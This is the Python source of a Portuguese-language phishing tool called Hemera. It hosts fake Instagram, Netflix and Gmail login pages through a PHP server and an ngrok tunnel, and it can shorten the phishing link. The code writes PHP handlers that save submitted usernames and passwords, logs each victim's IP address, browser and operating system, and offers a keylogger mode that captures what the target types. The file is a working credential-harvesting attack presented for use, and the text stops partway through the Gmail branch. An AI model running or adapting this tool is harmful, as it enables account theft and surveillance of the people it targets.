#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Hemera Project
Developer: Diego333-ms
Github: https://github.com/Diego333-ms
Leia o arquivo LICENSE
'''

#Cores do Algoritmo
R = '\033[31m' # Vermelho
G = '\033[32m' # Verde
C = '\033[36m' # Ciano
W = '\033[0m'  # Branco
Y = '\33[93m'  # Amarelo
B = '\33[94m'  # Azul
P = '\33[35m'  # Roxo
template_phishing = "Sem Template ativo"
porta = 8080
url_action = "Sem URL de Destino ativa"
encurtar_url = "off"
keylogger = "off"

#Módulos
import os
import time
import requests
import sys
import subprocess
import os.path
from datetime import datetime
from shutil import which

def verificar_dependencias(): #Verificar se o usuário possui os requisitos instalados
   print (W + "[" + G + "+" + W + "]" + C + " Verificando Dependencias..." + W)
   time.sleep(1.5)
   pkgs = ["python3", "pip3", "php", "curl"]
   inst = True
   for pkg in pkgs:
          present = which(pkg)
          if present == None:
                  print ("\n" + W + "[" + R + "-" + W + "] " + W + pkg + R + " não instalado!")
                  inst = False
          else:
                  pass
   if inst == False:
        exit()
   else:
          pass
          banner_program()

def banner_program(): #Banner do Programa
   os.system("clear")
   print (G +
        r'''
.__
|  |__   ____   _____   ________________
|  |  \_/ __ \ /     \_/ __ \_  __ \__  \
|   Y  \  ___/|  Y Y  \  ___/|  | \// __ \_
|___|  /\___  >__|_|  /\___  >__|  (____  /
     \/     \/      \/     \/           \/   ''')
   print ("\t" + W + ".:. Diego333-ms .:. 1.6")

def menu_program(): #Menu do Programa
   verificar_log = os.path.exists("config_log.txt") #Verificar se o arquivo de log existe
   if (verificar_log == True):
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja utilizar a configuração de Phishing anterior? Y/n: ")
     choice = str(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + G))
     if (choice == "y" or choice == "Y" or choice == "yes" or choice == "YES" or choice == "s" or choice == "sim" or choice == "SIM"):
       menu_log()
     else:
       os.system("rm -rf config_log.txt")
       banner_program()
       menu_program()
   else:
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "help" + C + " ou " + G + "?" + C + " para obter ajuda")
     global template_phishing
     global porta
     global url_action
     global encurtar_url
     global keylogger
     while (True):
        dados = str(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + G))
        prompt = dados.split() #Converter as strings digitadas acima em uma lista ou array
        if (not prompt): #Se nada foi digitado, continue a execução
          continue
        elif (prompt[0] == "show" or prompt[0] == "SHOW" or prompt[0] == "show" and prompt[1] == "options"):
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
           banner_program()
           print ("\n" +  W + "--------------------------------------")
           print ("\n" +  C + "Template:" + G + "\t" + " %s" %template_phishing)
           print ("\n" +  C + "Porta:" + G + "\t\t" + " %i" %porta)
           print ("\n" +  C + "URL de Ação:" + G + "\t" + " %s" %url_action)
           print ("\n" +  C + "Encurtar URL:" + G + "\t" + " %s" %encurtar_url)
           print ("\n" +  C + "Keylogger:" + G + "\t" + " %s" %keylogger)
           print ("\n" +  W + "--------------------------------------")
           continue
         except IndexError:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Comando incompleto! use: " + W + "show options")
           time.sleep(2.5)
           banner_program()
        elif (prompt[0] == "help" or prompt[0] == "HELP" or prompt[0] == "h" or prompt[0] == "?"):
          banner_program()
          print ("\n" +  C + "Comando:" + W + " show options " + C + "=> " + G + "exibir configuração de Phishing")
          print ("\n" +  C + "Comando:" + W + " display templates " + C + "=> " + G + "exibir templates disponiveis")
          print ("\n" +  C + "Comando:" + W + " set template (instagram,netflix,gmail) " + C + "=> " + G + "setar um Template")
          print ("\n" +  C + "Comando:" + W + " set porta (8080,3333) " + C + "=> " + G + "setar uma Porta")
          print ("\n" +  C + "Comando:" + W + " set action url (link destino após o alvo cair no Phishing) " + C + "=> " + G + "setar uma URL de Destino")
          print ("\n" +  C + "Comando:" + W + " set url encurter (on,off) " + C + "=> " + G + "ativar ou desativar modo encurtar url do Phishing")
          print ("\n" +  C + "Comando:" + W + " set keylogger mode (on,off) " + C + "=> " + G + "ativar ou desativar modo Keylogger (captura de teclas do alvo)")
          print ("\n" +  C + "Comando:" + W + " help " + C + "=> " + G + "obter ajuda")
          print ("\n" +  C + "Comando:" + W + " exploit " + C + "=> " + G + "Executar o Phishing")
          print ("\n" +  C + "Comando:" + W + " sair " + C + "=> " + G + "sair do Programa")
          continue
        elif (prompt[0] == "set" and prompt[1] == "template"):
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "netflix" or template_phishing == "gmail" or template_phishing == "outlook"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " O comando está incorreto!")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "keylogger" and prompt[2] == "mode"):
          try:
            keylogger = str(prompt[3])
            if (keylogger == "on" or keylogger == "ON" or keylogger == "off" or keylogger == "OFF"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite" + R + " on " + C + "ou " + R + "off")
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um valor válido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "display" and prompt[1] == "templates" or prompt[0] == "DISPLAY" and prompt[1] == "TEMPLATES"):
          print ("\n" +  C + "Templates Disponiveis:" + G + " instagram,gmail,netflix,outlook")
          continue
        elif (prompt[0] == "set" and prompt[1] == "porta"):
          try:
            porta = int(prompt[2])
            if (porta == 22 or porta == 23 or porta == 53 or porta == 443 or porta == 80):
              porta = 8080
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A Porta digitada é usada por um serviço!")
              time.sleep(2.5)
              banner_program()
            else:
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma Porta válida")
            time.sleep(2.5)
            banner_program()
          except ValueError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um número para a Porta!")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "url" and prompt[2] == "encurter"):
          try:
            encurtar_url = str(prompt[3])
          except IndexError:
            encurtar_url = "off"
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Valor inválido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "action" and prompt[2] == "url"):
          try:
            url_action = str(prompt[3])
            verificar_action = "https://" in url_action
            if (verificar_action == True):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(2.5)
              banner_program()
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma URL válida")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "exploit" or prompt[0] == "EXPLOIT" or prompt[0] == "run"):
            verificar_action_url = "https:" in url_action
            if (verificar_action_url == True):
              if (template_phishing == "Sem Template ativo"):
                print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "set template " + C + "está incorreta!")
                time.sleep(2.5)
                banner_program()
              else:
                if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                elif (encurtar_url == "off" or encurtar_url == "OFF" and keylogger == "off" or keylogger == "OFF"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                else:
                  print ("\n" + W + "[" + R + "-" + W + "]" + C + " As opções " + R + "url encurter " + C + "e " + R + "keylogger mode " + C + "não podem ser diferentes!")
                  time.sleep(2.5)
                  banner_program()
                  continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "action url" + C + " está incorreta!")
              time.sleep(2.5)
              banner_program()
        elif (prompt[0] == "sair" or prompt[0] == "SAIR" or prompt[0] == "quit"):
          stop()
          break
        else:
          print ("\n" + W + "[" + R + "-" + W + "]" + C + " O comando digitado é inválido!")
          time.sleep(2.5)
          banner_program()
          continue

def phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger):
   if (template_phishing == "instagram"): #Phishing Instagram
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/instagram/login.php")
       os.system("touch templates/instagram/login.php")
       url_destiny = open("templates/instagram/login.php", "w")
       conteudo = ('''<?php
include 'ip.php';

file_put_contents("usernames.txt", "EMAIL: " . $_POST['username'] . " PASS: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: %s');
exit();''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("cd templates/instagram && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       time.sleep(2.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing LAN: " + G + " http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/instagram/ip.txt")
               verificar_credenciais = os.path.exists("templates/instagram/usernames.txt")
               verificar_keylogger = os.path.exists("templates/instagram/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/instagram/ip.txt templates/instagram/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/instagram/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/instagram/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 arquivo_dados = open("templates/instagram/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Usuário Instagram: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 time.sleep(1.2)
                 arquivo_rede = open("templates/instagram/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[1])
                 user_agent = str(conteudo_rede[3])
                 sistema_alvo = str(conteudo_rede[5])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/instagram/ip.txt")
               verificar_credenciais = os.path.exists("templates/instagram/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/instagram/ip.txt templates/instagram/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/instagram/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Usuário Instagram: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/instagram/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[1])
                 user_agent = str(conteudo_rede[3])
                 sistema_alvo = str(conteudo_rede[5])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/instagram/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
             else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
       else:
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "netflix"): #Phishing Netflix
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/netflix/login.php")
       os.system("touch templates/netflix/login.php")
       url_destiny = open("templates/netflix/login.php", "w")
       conteudo = ('''<?php
file_put_contents("usernames.txt", "Usuario: " . $_POST['email'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: %s');
exit();''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/netflix && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing LAN: " + G + " http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/netflix/ip.txt")
               verificar_credenciais = os.path.exists("templates/netflix/usernames.txt")
               verificar_keylogger = os.path.exists("templates/netflix/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/netflix/ip.txt templates/netflix/ip_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/netflix/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/netflix/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/netflix/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Email Netflix: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/netflix/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[1])
                 user_agent = str(conteudo_rede[3])
                 sistema_alvo = str(conteudo_rede[5])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/netflix/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/netflix/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/netflix/ip.txt")
               verificar_credenciais = os.path.exists("templates/netflix/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/netflix/ip.txt templates/netflix/ip_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/netflix/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Email Netflix: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/netflix/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[1])
                 user_agent = str(conteudo_rede[3])
                 sistema_alvo = str(conteudo_rede[5])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/netflix/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/netflix/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
             else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
       else:
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "gmail"): #Phishing Gmail
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/gmail/login.php")
       os.system("touch templates/gmail/login.php")
       url_destiny = open("templates/gmail/login.php", "w")
       conteudo = ('''<?php
include 'ip.php';
                        session_start();

                        $pass = $_POST["password"];
                        $email=$_SESSION["Email"];


                        file_put_contents("usernames.txt", "EMAIL: " . " ". $email . " " . " " . "PASS: " . " " . $pass . "\n", FILE_APPEND);
                        header('Location: %s');
                        exit();


                        session_destroy();

?>''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/gmail && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing LAN: " + G + " http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/gmail/ip.txt")
               verificar_credenciais = os.path.exists("templates/gmail/usernames.txt")
               verificar_keylogger = os.path.exists("templates/gmail/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/gmail/ip.txt templates/gmail/ip_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/gmail/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/gmail/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
